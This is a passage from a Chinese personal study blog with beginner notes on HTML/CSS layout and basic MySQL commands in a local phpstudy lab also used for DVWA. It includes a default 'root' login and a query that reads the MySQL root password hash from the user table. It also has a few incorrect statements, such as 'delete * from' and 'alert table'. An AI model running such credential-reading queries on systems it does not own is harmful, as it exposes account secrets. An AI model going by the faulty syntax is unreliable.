class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第5<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>第五个abcdefghijk<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://fata.taosu0216.cn&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;400&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;500&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h1><h2 id="2-div和css"><a href="#2-div和css" class="headerlink" title="2.div和css"></a>2.div和css</h2><h3 id="1-选择器"><a href="#1-选择器" class="headerlink" title="1.选择器"></a>1.选择器</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">*&#123;</span><br><span class="language-css"><span class="hljs-attribute">margin</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css"><span class="hljs-attribute">color</span>: green;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.demo</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">color</span>: <span class="hljs-number">#66ccff</span>;</span><br><span class="language-css"><span class="hljs-attribute">font-family</span>: Lucida Handwriting;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-tag">p</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">font-family</span>: Lucida Handwriting;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-id">#demo1</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">color</span>:grey;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span>daily growing<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!--类似id,但能用很多次--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;demo1&quot;</span>&gt;</span>the faster u move<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!--对id进行唯一选择--&gt;</span>&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>the heavier u get<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-comment">&lt;!--对元素选择--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-背景"><a href="#2-背景" class="headerlink" title="2.背景"></a>2.背景</h3><table><thead><tr><th>background-</th><th>用处</th></tr></thead><tbody><tr><td>color</td><td>颜色</td></tr><tr><td>image</td><td>图片</td></tr><tr><td>repeat</td><td>当图片不适配页面(过长或过高时,是否重复出现图片占满网页背景)</td></tr><tr><td>size</td><td>背景图片大小,cover就是全部填充,也可以是px</td></tr><tr><td>attachment</td><td>fixed就是一图流,scroll就是头图</td></tr></tbody></table><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &lt;<span class="hljs-attr">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="language-css"><span class="language-xml">    <span class="hljs-selector-tag">body</span>&#123;</span></span><br><span class="language-css"><span class="language-xml"><span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/psc.jfif</span>);</span></span><br><span class="language-css"><span class="language-xml">                <span class="hljs-attribute">background-repeat</span>: no-repeat;</span></span><br><span class="language-css"><span class="language-xml">                <span class="hljs-attribute">background-size</span>: <span class="hljs-number">700px</span>;</span></span><br><span class="language-css"><span class="language-xml">                <span class="hljs-attribute">background-attachment</span>: fixed;</span></span><br><span class="language-css"><span class="language-xml">&#125;</span></span><br><span class="language-css"><span class="language-xml">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>aaaaaaaaaaaaaaaaaaaaaaaa&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>aaaaaaaaaaaaaaaaaaaaaaaa&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>aaaaaaaaaaaaaaaaaaaaaaaa&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>aaaaaaaaaaaaaaaaaaaaaaaa&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>aaaaaaaaaaaaaaaaaaaaaaaa&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>aaaaaaaaaaaaaaaaaaaaaaaa&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>aaaaaaaaaaaaaaaaaaaaaaaa&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="3-边框"><a href="#3-边框" class="headerlink" title="3.边框"></a>3.边框</h3><table><thead><tr><th>border</th><th>用处</th></tr></thead><tbody><tr><td>color</td><td>边框颜色</td></tr><tr><td>width</td><td>边框宽度</td></tr><tr><td>style</td><td>solid是实线框,dashed是虚线框</td></tr><tr><td>width,height</td><td>整个边框的宽度,高度</td></tr><tr><td>left,right,top,bottom</td><td>单独设置上下左右边框</td></tr></tbody></table><table><thead><tr><th>文本</th><th>用处</th></tr></thead><tbody><tr><td>text-align</td><td>center 居中</td></tr><tr><td>text-height</td><td>5px 行间距</td></tr><tr><td>text-indent</td><td>首行缩进</td></tr><tr><td>text-decoration</td><td>none,underline(下滑线),overline(上划线),line-through(删除线)</td></tr></tbody></table><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>.div1&#123;<br>                border-color: #66ccff;<br>                border-width: 5px;<br>                border-style: dashed;<br>                width: 300px;<br>                height: 300px;<br>                border-left: groove red 10px;<br>            &#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;div1&quot;</span>&gt;</span><br>这是边框里的内容<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4-盒子"><a href="#4-盒子" class="headerlink" title="4.盒子"></a>4.盒子</h3><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230408222109.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230408222109.png" alt="img"></a><br>margin就是页边距</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>盒子模型和padding<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">            <span class="hljs-selector-class">.div1</span>&#123;</span><br><span class="language-css">                <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">                <span class="hljs-attribute">width</span>: <span class="hljs-number">500px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">height</span>: <span class="hljs-number">500px</span>;</span><br><span class="language-css">                <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#66ccff</span>;</span><br><span class="language-css">                <span class="hljs-attribute">border-style</span>: dashed;</span><br><span class="language-css">                <span class="hljs-attribute">margin</span>: <span class="hljs-number">200px</span> <span class="hljs-number">30px</span> <span class="hljs-number">40px</span> <span class="hljs-number">500px</span>;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;div1&quot;</span>&gt;</span><br>            内容<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="5-浮动"><a href="#5-浮动" class="headerlink" title="5.浮动"></a>5.浮动</h3><p>一般用于导航栏,比如博客左上角是Fata home,这是左浮动,而搜索,关于等在导航栏右侧,这就是右浮动(&amp;nbsp是空格)<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230409160650.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230409160650.png" alt="稍微仿一下站"></a>)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>导航栏<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">            <span class="hljs-selector-class">.demo</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:left</span>;</span><br><span class="language-css"><span class="hljs-attribute">font-family</span>:Lucida Handwriting;</span><br><span class="language-css">                <span class="hljs-attribute">font-size</span>:<span class="hljs-number">20px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.demo1</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:right</span>;</span><br><span class="language-css">                <span class="hljs-attribute">font-family</span>:Comic Sans MS,<span class="hljs-string">&quot;华文中宋&quot;</span>;</span><br><span class="language-css">                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css">            <span class="hljs-selector-tag">a</span>&#123;</span><br><span class="language-css">                <span class="hljs-attribute">color</span>:black;</span><br><span class="language-css">                <span class="hljs-attribute">text-decoration</span>: none;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">            <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;</span><br><span class="language-css">                <span class="hljs-attribute">color</span>: darkgrey;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><br>            Fata`Home<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>搜索 <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>home <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>category <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>about<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h1><h2 id="1-sql"><a href="#1-sql" class="headerlink" title="1.sql"></a>1.sql</h2><p>数据库 &gt;&gt; 数据表 &gt;&gt; 记录,字段 &gt;&gt; 字段内容 (记录可以理解成行的表头,字段理解为列的表头,一个记录一般有多个字段,记录为具体的事物比如学生,列可以是名字,姓名,年龄等)<br>phpstudy2018版本,登陆密码为root<br>可以直接从phpstudy里进入命令行<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230409170416.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230409170416.png" alt="img"></a><br>也可以从cmd命令行窗口输入 phpstudy的mysql的bin文件所在的路径进入<code>phpstudy\PhpStudy2018\PHPTutorial\MySQL\bin&gt;mysql.exe -u root -p</code><br>因为之前进过dvwa,更改过密码,所以直接输入没有显示,这里可以挨个进入文件夹,进入到bin文件夹之后,输入<code>mysql.exe -u root -p</code>来输入密码<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230409170647.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></p><table><thead><tr><th>登陆的语法</th><th>用处</th></tr></thead><tbody><tr><td>-h127.0.0.1</td><td>连接本地</td></tr><tr><td>\q</td><td>退出</td></tr><tr><td><code>show databases;</code></td><td>列出数据库(这一步不知道为什么一直不行,先用了一次use test以后才能用这个操作,估计还是前面搭dvwa的锅),在跟bin同文件夹下的data文件夹的内容就是数据库</td></tr><tr><td>use mysql</td><td>使用mysql数据库</td></tr><tr><td>show tables;</td><td>列出数据表</td></tr></tbody></table><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230409215120.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="中间又是不知道原因的n次报错以及莫名其妙的能用了"></a><br>查询用户密码,本质是 select * from database where id &#x3D;’’<br><code>select password from user where user=&#39;root&#39;</code></p><h3 id="1-基础操作"><a href="#1-基础操作" class="headerlink" title="1.基础操作"></a>1.基础操作</h3><table><thead><tr><th>语法</th><th>用处</th></tr></thead><tbody><tr><td>create database (name);</td><td>新建名为(name)的数据库<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230409215846.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></td></tr><tr><td>show status</td><td>展示数据库状态</td></tr><tr><td>desc user</td><td>desc就是describe,描述用户状态</td></tr><tr><td>show databases;</td><td>展示所有数据库</td></tr><tr><td>show create database (name);</td><td>展示建立的数据库</td></tr><tr><td>drop database (name);</td><td>删除数据库</td></tr></tbody></table><h3 id="2-数据表的操作"><a href="#2-数据表的操作" class="headerlink" title="2.数据表的操作"></a>2.数据表的操作</h3><p>alter<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411214451.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411214451.png" alt="img"></a></p><table><thead><tr><th>语法</th><th>用处</th></tr></thead><tbody><tr><td>show tables</td><td>展示当前数据库的所有数据表</td></tr><tr><td>create table (name)</td><td>属性名 数据类型 约束条件</td></tr><tr><td>drop table (name)</td><td>删除表</td></tr><tr><td>desc (table name)</td><td>查看表单的信息</td></tr><tr><td>alter table (name) rename (new name);</td><td>改表的名字</td></tr><tr><td>alter table (name) modify 属性名 数据类型;</td><td>修改表中的字段的数据类型<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411213232.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></td></tr><tr><td>alert table (name) change (旧名字) (新名字) 数据类型;</td><td>给字段改名字<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411214115.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411214115.png" alt="img"></a></td></tr><tr><td>alter table （name） add （字段 name） 数据类型 约束条件；</td><td>增加字段<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411214834.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411214834.png" alt="img"></a></td></tr><tr><td>alter table （name） drop (name)</td><td>删除字段<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411215205.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411215205.png" alt="img"></a></td></tr><tr><td>alter table (name) engine &#x3D; (name)</td><td>修改引擎<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411215553.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411215553.png" alt="img"></a></td></tr></tbody></table><p>create table example(<br>属性名 数据类型 完整约束条件 ,<br>属性名 数据类型 完整约束条件 ,<br>属性名 数据类型 完整约束条件<br>)ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; (有时候utf-8,有时候utf8) 要么都用&lt;&gt;或者都用()</p><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>1.整数类型 : BIT; BOOL; INT; SMALL&#x2F;MEDIUM&#x2F;BIG INT<br>2.浮点 : FLOAT; DOUBLE;<br>3.字符串 : CHAR; VARCHAR; TEXT<br>4.日期 : DATE; DATETIME;</p><h4 id="约束条件"><a href="#约束条件" class="headerlink" title="约束条件"></a>约束条件</h4><ol><li>NOT NULL 不能存储null值</li><li>AUTO_INCREMENT 自动增长</li></ol><h4 id="数据库引擎-可以不写-数据越大时引擎越有用-搜索速度更快"><a href="#数据库引擎-可以不写-数据越大时引擎越有用-搜索速度更快" class="headerlink" title="数据库引擎(可以不写,数据越大时引擎越有用,搜索速度更快)"></a>数据库引擎(可以不写,数据越大时引擎越有用,搜索速度更快)</h4><ol><li>InnoDB 支付相关</li><li>myisam 存储数据,大数据查询</li></ol><h3 id="3-数据-字段-的操作"><a href="#3-数据-字段-的操作" class="headerlink" title="3.数据(字段)的操作"></a>3.数据(字段)的操作</h3><p>学的真累</p><table><thead><tr><th>操作</th><th>用处</th></tr></thead><tbody><tr><td>insert into (name) <del>(字段名1,字段名2)</del> values (值1,值2) (字段名不写的话就是按顺序默认加数据)</td><td>给字段添加具体数据(字段名和values都要加括号)<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411222838.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411222838.png" alt="不加table 不加table 不加table"></a></td></tr><tr><td>select * from (table name) (不加<code>*</code>就是具体字段名)</td><td>查询数据<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411223133.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411223133.png" alt="出现了,最开始学的select * from"></a></td></tr><tr><td>delete * from (table name)</td><td>删除表内所有数据</td></tr><tr><td>truncate table (name)</td><td>彻底删除表,如果再新加数值,id默认从1开始累加,而delete不是</td></tr><tr><td>update (table name) set (字段name) &#x3D; () where id &#x3D; ()</td><td>更改数据,是表名直接到字段的具体数据名字,中间没有字段名字<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411234149.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230411234149.png" alt="img"></a></td></tr><tr><td>&lt;&gt;</td><td>不等于符号<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412001233.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></td></tr><tr><td>select distinct (name) from (table name);</td><td>排除数据相同的字段,显示数据不相同的(就是一样的东西只显示一遍)<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412001233.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></td></tr><tr><td>select * from (table name) where (数据name) (not) between () and ();</td><td>!查询在一个区间的数据<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412201126.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a></td></tr></tbody></table><p>一个新的表<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230412220030.png"><img 